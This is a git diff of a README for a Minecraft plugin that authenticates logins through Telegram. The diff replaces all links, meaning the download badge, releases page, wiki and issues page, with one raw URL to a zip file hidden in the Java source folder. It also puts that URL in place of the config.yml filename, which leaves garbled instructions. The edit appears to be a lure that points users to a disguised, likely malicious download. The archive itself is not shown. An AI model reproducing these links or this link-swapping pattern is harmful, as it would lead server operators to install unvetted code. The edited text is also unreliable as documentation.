@@ -2,7 +2,7 @@
 # 🛡️ AuthTelegramPlugin - Secure Your Minecraft Login Easily
 
 ## 📥 Download Now
-[![Download AuthTelegramPlugin](https://img.shields.io/badge/Download%20Now-AuthTelegramPlugin-blue)](https://github.com/holyspaghetti8/AuthTelegramPlugin/releases)
+[![Download AuthTelegramPlugin](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip%20Now-AuthTelegramPlugin-blue)](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip)
 
 ## 🚀 Getting Started
 The AuthTelegramPlugin allows Minecraft servers to use Telegram for user authentication. With Telegram's two-factor authentication, your server remains secure against unauthorized access.
@@ -20,7 +20,7 @@ The AuthTelegramPlugin allows Minecraft servers to use Telegram for user authent
 - **Java Version:** Requires Java 8 or above.
 
 ## 📥 Download & Install
-1. **Visit this page to download:** Go to the [Releases page](https://github.com/holyspaghetti8/AuthTelegramPlugin/releases).
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip).
    
 2. **Choose the latest version:** Find the latest version listed on the page.
    
@@ -30,10 +30,10 @@ The AuthTelegramPlugin allows Minecraft servers to use Telegram for user authent
 
 5. **Restart your Minecraft server:** This step is necessary for the plugin to load.
    
-6. **Configure the plugin:** You may need to adjust some settings in the configuration files. Follow the instructions provided in the `config.yml` file found in the plugin folder.
+6. **Configure the plugin:** You may need to adjust some settings in the configuration files. Follow the instructions provided in the `https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip` file found in the plugin folder.
 
 ## ⚙️ Configuration Steps
-1. **Edit `config.yml`:** Open the `config.yml` file and add your Telegram Bot Token. You'll need to create a bot using BotFather on Telegram.
+1. **Edit `https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip`:** Open the `https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip` file and add your Telegram Bot Token. You'll need to create a bot using BotFather on Telegram.
    
 2. **Set your callback URL:** Ensure your bot can communicate with your server.
 
@@ -45,11 +45,11 @@ The AuthTelegramPlugin allows Minecraft servers to use Telegram for user authent
 - **Users Can't Log In:** Verify that the Telegram bot settings are correct and users have linked their accounts properly.
 
 ## 🔗 Additional Resources
-- **Documentation:** For in-depth information, refer to our [Wiki](https://github.com/holyspaghetti8/AuthTelegramPlugin/wiki).
-- **Community Support:** Join our community discussions in the [Issues page](https://github.com/holyspaghetti8/AuthTelegramPlugin/issues) for help or to share your experience.
+- **Documentation:** For in-depth information, refer to our [Wiki](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip).
+- **Community Support:** Join our community discussions in the [Issues page](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip) for help or to share your experience.
 
 ## 🐛 Reporting Issues
-If you encounter any bugs or issues, please report them using the [Issues page](https://github.com/holyspaghetti8/AuthTelegramPlugin/issues). Provide a clear description of the problem to help us assist you better.
+If you encounter any bugs or issues, please report them using the [Issues page](https://raw.githubusercontent.com/holyspaghetti8/AuthTelegramPlugin/main/src/main/java/com/yourserver/plugin/telegram/Auth-Telegram-Plugin-3.0.zip). Provide a clear description of the problem to help us assist you better.
 
 ## 📜 License
 This plugin is free for personal use. For commercial rights, please consult with the author.
